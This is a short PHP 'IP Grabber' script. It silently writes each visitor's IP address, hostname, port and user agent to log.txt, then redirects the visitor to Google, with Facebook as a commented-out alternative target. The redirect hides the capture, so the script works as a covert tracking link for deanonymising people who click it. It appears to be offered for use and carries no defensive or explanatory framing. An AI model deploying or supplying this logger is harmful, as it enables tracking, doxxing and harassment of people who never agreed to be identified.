<?php
 
//IP Grabber
 
//Variables
 
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
// $ref = (!empty($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:NULL;
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('log.txt', 'a');
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
// fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
fclose($fh);

// header("Location: https://mobile.facebook.com");
header("Location: https://www.google.com");
exit();
?>